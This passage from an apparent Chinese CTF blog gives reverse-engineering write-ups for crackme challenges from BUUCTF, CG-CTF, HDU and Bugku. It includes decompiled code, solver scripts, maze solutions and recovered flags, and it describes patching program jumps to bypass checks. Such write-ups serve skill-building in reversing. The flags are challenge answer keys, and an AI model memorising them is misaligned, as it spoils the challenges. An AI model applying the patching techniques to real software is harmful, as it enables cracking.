<p>如果输入的字符串满足这串超级长的判断则correct……<br>这串判断是由很多判断用&amp;&amp;连接起来的，分开之后按长度排序是这样的：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvctPg.png"></p>
<p>这就可以看出端倪了，按照这个顺序一个个判断的话每一次判断可以确定一个字符，上脚本吧：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">src=<span class="string">&#x27;超长判断&#x27;</span>.split(<span class="string">&#x27;&amp;&amp;&#x27;</span>)</span><br><span class="line">a=list(range(<span class="number">47</span>))</span><br><span class="line">src.sort(key=<span class="keyword">lambda</span> x:len(x))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">47</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        a[i]=j</span><br><span class="line">        <span class="keyword">if</span> eval(src[i]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(chr(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;wh47_my5ter10us-do3s,the+phe45ant/c0nta1n&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="证明自己吧"><a href="#证明自己吧" class="headerlink" title="证明自己吧"></a>证明自己吧</h2><p>主函数是这样的：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zv21N8.png"></p>
<p>输入<code>V4</code>,然后跟进判断函数：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zv2y34.png"></p>
<p>输入的数据异或<code>0x20</code>，<code>v5</code>减<code>5</code>，之后比较，直接把<code>v5</code>的数据加<code>5</code>再异或<code>0x20</code>就可以了。</p>
<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p>IDA查看主函数，跟进找到判断函数：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvWMY8.png"></p>
<p>输入长度为8的字符串给<code>String</code>之后进行判断:</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvflAx.png"></p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvfD4f.png"></p>
<p>跟进<code>sub4010F0</code>分析得知是一个排序算法，将<code>v7</code>后连续10个数据进行排序，<code>sub401000</code>是base64编码，再根据后面的if判断，可以知道<code>String</code>第一位是排序后的<code>v7</code>，第二位是排序后的<code>v11</code>,后六位分别是<code>V1Ax</code>和<code>ak1w</code>的base64解码，拼在一起得到flag。</p>
<h1 id="CG-CTF"><a href="#CG-CTF" class="headerlink" title="CG-CTF"></a>CG-CTF</h1><h2 id="WxyVM1"><a href="#WxyVM1" class="headerlink" title="WxyVM1"></a>WxyVM1</h2><p>ELF文件，IDA查看：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvIiMF.png"></p>
<p>结构很简单，输入，，执行<code>sub4005B6</code>,判断长度，比较，要比较的字符串是给了的，只需要分析<code>sub4005B6</code>这个加密函数，跟进：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zvo86U.png"></p>
<p>从<code>0x6010C0</code>开始取15000个数据来对输入进行加密，每三个一组，三个中第一个决定操作方式，第二个决定操作输入字符串中的第几位的字符，第三位决定进行操作的数据，IDC逆向脚本跑一下就能跑出输入的字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> i;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">14997</span>; i &gt;= <span class="number">0</span>; i = i - <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">auto</span> v0 = Byte(<span class="number">0x6010C0</span>+i);</span><br><span class="line">    <span class="keyword">auto</span> v3 = Byte(<span class="number">0x6010C0</span>+(i + <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">auto</span> result = v0;</span><br><span class="line">    <span class="keyword">if</span>(v0==<span class="number">1</span>)&#123;</span><br><span class="line">        result =Byte(<span class="number">0x6010C0</span>+i + <span class="number">1</span>);</span><br><span class="line">        PatchByte(<span class="number">0x601060</span> + result*<span class="number">4</span>,Byte(<span class="number">0x601060</span> + result*<span class="number">4</span>)-v3);</span><br><span class="line">            &#125;</span><br><span class="line">     <span class="keyword">if</span>(v0==<span class="number">2</span>)&#123;</span><br><span class="line">         result =Byte(<span class="number">0x6010C0</span>+i + <span class="number">1</span>);</span><br><span class="line">       PatchByte(<span class="number">0x601060</span> + result*<span class="number">4</span>,Byte(<span class="number">0x601060</span> + result*<span class="number">4</span>)+v3);</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">if</span>(v0==<span class="number">3</span>)&#123;</span><br><span class="line">        result =Byte(<span class="number">0x6010C0</span>+i + <span class="number">1</span>);</span><br><span class="line">        PatchByte(<span class="number">0x601060</span> + result*<span class="number">4</span>,Byte(<span class="number">0x601060</span> + result*<span class="number">4</span>)^v3);</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="keyword">if</span>(v0==<span class="number">4</span>)&#123;</span><br><span class="line">        result =Byte(<span class="number">0x6010C0</span>+i + <span class="number">1</span>);</span><br><span class="line">        PatchByte(<span class="number">0x601060</span> + result*<span class="number">4</span>,Byte(<span class="number">0x601060</span> + result*<span class="number">4</span>)/v3);</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="keyword">if</span>(v0==<span class="number">5</span>)&#123;</span><br><span class="line">         result =Byte(<span class="number">0x6010C0</span>+i + <span class="number">1</span>);</span><br><span class="line">    PatchByte(<span class="number">0x601060</span> + result*<span class="number">4</span>,Byte(<span class="number">0x601060</span> + result*<span class="number">4</span>)^Byte(<span class="number">0x601060</span>+v3*<span class="number">4</span>));</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">Message(<span class="string">&quot;%c&quot;</span>,Byte(<span class="number">0x601060</span>+i*<span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//nctf&#123;Embr4ce_Vm_j0in_R3&#125;</span></span><br></pre></td></tr></table></figure>
<p>也可以dump下来用python脚本跑。</p>
<h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-28h]      //划重点，64位整型</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s1, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) != <span class="number">24</span> || (v3 = <span class="string">&quot;nctf&#123;&quot;</span>, <span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;nctf&#123;&quot;</span>, <span class="number">5u</span>LL)) || *(&amp;byte_6010BF + <span class="number">24</span>) != <span class="number">125</span> )  <span class="comment">//判断flag格式</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong flag!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">5L</span>L;                <span class="comment">//v4是遍历下标，从5开始，因为前5位是flag格式，上面已经判断过</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> &gt; <span class="number">5</span> )    <span class="comment">//上面已经判断过长度，这里是干扰代码</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(&amp;s1 + v4);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="number">78</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="number">79</span> )          <span class="comment">//若字符==&#x27;O&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400650((<span class="keyword">char</span> *)&amp;v10 + <span class="number">4</span>, v3);   <span class="comment">//v10低32位减1，并判断是否越界</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">111</span> )                           <span class="comment">//若字符==&#x27;o&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400660((<span class="keyword">char</span> *)&amp;v10 + <span class="number">4</span>, v3);   <span class="comment">//v10低32位加1，并判断是否越界</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="number">46</span> )            <span class="comment">//若字符==&#x27;.&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400670(&amp;v10, v3);               <span class="comment">//v10高32位减1，并判断是否越界</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">48</span> )                            若字符==<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400680(&amp;v10, v3);                <span class="comment">//v10高32位加1，并判断是否越界</span></span><br><span class="line">LABEL_14:</span><br><span class="line">          v6 = v7;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">      v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)HIDWORD(v10);    </span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_400690(asc_601060, HIDWORD(v10), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10) )   <span class="comment">//用高32位和低32位表示行和列，判断在地图中是否撞墙</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> )   <span class="comment">//判断字符串读取结束</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )    <span class="comment">//判断是否撞墙</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">        v8 = <span class="string">&quot;Wrong flag!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( asc_601060[<span class="number">8</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)v10 + SHIDWORD(v10)] != <span class="number">35</span> )  <span class="comment">//判断是否到达终点&quot;#&quot;</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  v8 = <span class="string">&quot;Congratulations!&quot;</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">  <span class="built_in">puts</span>(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>地图是在判断是否越界的函数中可以看出是8*8，判断是否撞墙的函数中可以找到地图数据，人脑遍历地图路线得到答案，地图和答案如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  ******</span><br><span class="line">*   *  *</span><br><span class="line">*** * **</span><br><span class="line">**  * **</span><br><span class="line">*  *#  *</span><br><span class="line">** *** *</span><br><span class="line">**     *</span><br><span class="line">********</span><br><span class="line">o0oo00O000oooo..OO</span><br></pre></td></tr></table></figure>

<h1 id="杭电CTF"><a href="#杭电CTF" class="headerlink" title="杭电CTF"></a>杭电CTF</h1><h2 id="Beat-our-dice-game-and-get-the-flag"><a href="#Beat-our-dice-game-and-get-the-flag" class="headerlink" title="Beat our dice game and get the flag"></a>Beat our dice game and get the flag</h2><p>代码看起来比较畸形，用ollydbg动态调试看字符串可以大体猜出程序，一个扔骰子的游戏，要求多次按<code>enter</code>随机扔骰子，必须都扔到程序规定的数，甚至还要求扔到七：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZxUtE9.png"></p>
<p>跟进找到每一个判断跳转，改掉没有扔到指定数的跳转，让程序一直运行下去到最后flag就会自己冒出来了：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZxUf8P.png"></p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZxwbUH.png"></p>
<p>这种没有输入的题，一般会比较简单，因为不用输入就表示flag就藏在文件中，只要能运行到某些命令就能拿到flag，不需要逆向算法什么的，这种应该只能叫破解，不能称为逆向才对。</p>
<h2 id="从文件中找flag"><a href="#从文件中找flag" class="headerlink" title="从文件中找flag"></a>从文件中找flag</h2><p>这个题好像实验吧也有，文件是一个叫keylead的文件，WinHex查看文件头发现是一个tar.xz的压缩包，Linux下解压后是一个ELF文件，IDA查看C语言伪代码，还是一个扔骰子…一样的方法，只是要在Linux环境下调试，用edb把关键跳转改掉，就可以得到flag</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZxBJYj.png"></p>
<p>flag我就不放了，懒得再去复盘截图，跟上一题一样的操作。</p>
<h1 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h1><h2 id="Mountain-climbing"><a href="#Mountain-climbing" class="headerlink" title="Mountain climbing"></a>Mountain climbing</h2><p>有一个UPX的壳，脱壳细节我在这里不细说，图简单的话吾爱破解有UPX脱壳工具，脱壳后先上IDA：</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzIBee.png"></p>
<p>先用随机数生成一系列数据，然后根据输入的字符串在数据中找出一条从数据第一行到最后一行的路线使得路线上的值加起来最大，计算机是没有真正的随机数的，程序中给定了随机数种子，生成的随机数就是确定的，先照着程序自己写一个一样的随机数跑出数据：</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzfA9f.png"></p>
<p>然后写脚本遍历所有路线求最大值吧：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, maxx = <span class="number">0</span>, top;</span><br><span class="line"><span class="keyword">char</span> maxs[<span class="number">20</span>], s[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	sum += arr[i][j];</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">19</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (sum &gt; maxx)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">strcpy</span>(maxs, s);</span><br><span class="line">			maxx = sum;</span><br><span class="line">		&#125;</span><br><span class="line">		sum -= arr[i][j];</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		s[top++] = <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">		fun(i + <span class="number">1</span>, j);</span><br><span class="line">		top--;</span><br><span class="line">		s[top++] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">		fun(i + <span class="number">1</span>, j + <span class="number">1</span>);</span><br><span class="line">		top--;</span><br><span class="line">	&#125;</span><br><span class="line">	sum -= arr[i][j];</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	srand(<span class="number">0xc</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			arr[i][j] = rand() % <span class="number">100000</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fun(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; maxs &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//RRRRRLLRRRLRLRRRLRL</span></span><br></pre></td></tr></table></figure>
<p>交上去却是错的，回去慢慢看发现还有一个加密，是将输入的偶数位异或<code>0x4</code>，IDA看比较丑，可以在ollydbg里面观察输入数据的变化很明显就能看出来(此处我输入的是<code>&#39;0&#39;*19</code>)：</p>
<p><img src="https://s2.ax1x.com/2019/07/20/Zzol1P.png"></p>
<p>把之前得到的字符串再异或一下就可以得到flag了。</p>
<h2 id="Take-the-maze"><a href="#Take-the-maze" class="headerlink" title="Take the maze"></a>Take the maze</h2><p>迷宫，IDA查看：</p>
<p><img src="https://s2.ax1x.com/2019/07/26/euuia6.png"></p>
<p>先让输入key，然后有个isdebuggerpresent反调试，之后判断key长度，第17位异或1，之后有个奇怪的函数，之后判断必须全是十六进制字符，不然goto16就结束了，然后进入关键判断，跟进,代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __cdecl <span class="title">sub_463480</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST18_4</span></span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+D8h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+E4h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+F0h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+FCh] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+108h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v9++;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">12</span> )           <span class="comment">//24个字符，遍历12次，表示是两个字符一组</span></span><br><span class="line">      <span class="keyword">return</span> v5 == <span class="number">311</span>;       <span class="comment">//v5==311则返回真，flag正确</span></span><br><span class="line">    <span class="keyword">if</span> ( sub_45B1C7() )       <span class="comment">//又是一个IsDebuggerPresent</span></span><br><span class="line">      j__exit(<span class="number">0</span>);</span><br><span class="line">    v2 = *(<span class="keyword">char</span> *)(v6++ + a1);<span class="comment">//v2一组两个字符的前一个</span></span><br><span class="line">    <span class="keyword">switch</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">4</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">        v4 = *(<span class="keyword">char</span> *)(v6++ + a1);<span class="comment">//v4表示后一个</span></span><br><span class="line">        <span class="keyword">switch</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">6</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">7</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">9</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">11</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">12</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">13</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">14</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            v7 = <span class="number">15</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">            <span class="keyword">switch</span> ( byte_541168[v8] ) <span class="comment">//byte_541168=&quot;delru0123456789&quot;</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:  <span class="comment">//down</span></span><br><span class="line">                sub_45CC4D((<span class="keyword">int</span>)&amp;v5, byte_541168[v7] - <span class="number">48</span>);<span class="comment">//向下走byte_541168[v7]-48步</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:  /left</span><br><span class="line">                sub_45D0A3((<span class="keyword">int</span>)&amp;v5, byte_541168[v7] - <span class="number">48</span>);<span class="comment">//向左走</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:  <span class="comment">//right</span></span><br><span class="line">                sub_45CB0D(&amp;v5, byte_541168[v7] - <span class="number">48</span>);<span class="comment">//向右走</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:  <span class="comment">//up</span></span><br><span class="line">                sub_45D0E9(&amp;v5, byte_541168[v7] - <span class="number">48</span>);<span class="comment">//向上走</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">              <span class="keyword">default</span>:</span><br><span class="line">                result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            result = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上下左右的函数长得都很像，大概像这样：</p>
<p><img src="https://s2.ax1x.com/2019/07/26/euKI7q.png"></p>
<p>其他三个结构都是一样的，不再赘述，<code>result</code>的赋值都没有意义，因为函数并没有返回有用的值到上层，从这里走到下一行需要加26还有到第11行(下标为10)再继续走就会越界可知地图是11*26+25的规模，关键在于判断是否能够这样走的那个判断，IDC脚本把0到311的异或结果给跑出来看看：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">311</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(Byte(<span class="number">0x540548</span>+<span class="number">4</span>*i)^Byte(<span class="number">0x540068</span>+i*<span class="number">4</span>))</span><br><span class="line">Message(<span class="string">&quot;1 &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Message(<span class="string">&quot;0 &quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((i+<span class="number">1</span>)%<span class="number">26</span>==<span class="number">0</span>)</span><br><span class="line">Message(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/26/euQNsH.png"></p>
<p>这是地图中每一个点能否往下走的dump结果，其他三个方向一样的方法，最后把四个方向的dump结果统一在一张地图上，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span 